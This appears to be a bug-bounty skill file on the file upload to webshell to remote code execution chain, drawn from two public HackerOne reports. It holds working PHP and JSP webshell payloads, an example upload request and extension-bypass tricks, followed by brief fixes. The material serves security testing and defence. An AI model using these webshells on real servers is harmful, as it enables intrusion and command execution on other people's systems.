---
name: upload-webshell-rce
description: Unrestricted file upload → webshell RCE (upload a .php/.jsp/.aspx and execute it). Teaches the classic upload→RCE chain and how to detect upload sinks.
sources: hackerone_public
report_count: 2
---

# File Upload → Webshell → RCE

**Reports**: Semrush — "RCE on www.semrush.com/my_reports on Logo upload" (#403417); Starbucks — "Webshell via File Upload on ecjobs.starbucks.com.cn" (#506646).

## Why it matters (the new lesson)
If an upload accepts a server-executable extension (`.php`, `.jsp`, `.jspx`, `.aspx`, `.phtml`, `.pht`, `.shtml`, `.phtm`) *and* serves it from a web-accessible path, you have instant RCE. The whole attack is: upload → find the URL → request it. Focus on **where** the file lands and **whether the server renders** it.

## How it works
```
POST /upload  (Content-Disposition: form-data; name="logo"; filename="shell.php")
body: <?php echo shell_exec($_GET['c']); ?>
```
Then `GET /uploads/shell.php?c=id`.

## How to hunt for it
1. Find upload endpoints (logo, avatar, report, attachment, signature).
2. Upload `shell.php` (and variants `.php5`, `.phtml`, `.pht`, `.php.jpg`, `.php%00.jpg`, case tricks, `.htaccess`).
3. Locate the file URL (response path, predictable `/uploads/`, directory listing).
4. Request it with a command; confirm RCE.

## Payloads
```php
<?php echo shell_exec($_GET['c']); ?>
<?=`$_GET[0]`;?>
<% Runtime.getRuntime().exec(request.getParameter("c")); %>  (jsp)
```

## Fix
Allowlist extensions; serve from non-executable/CDN origin; rename (server-generated names); sandbox/malware-scan; set correct MIME + `Content-Disposition`.
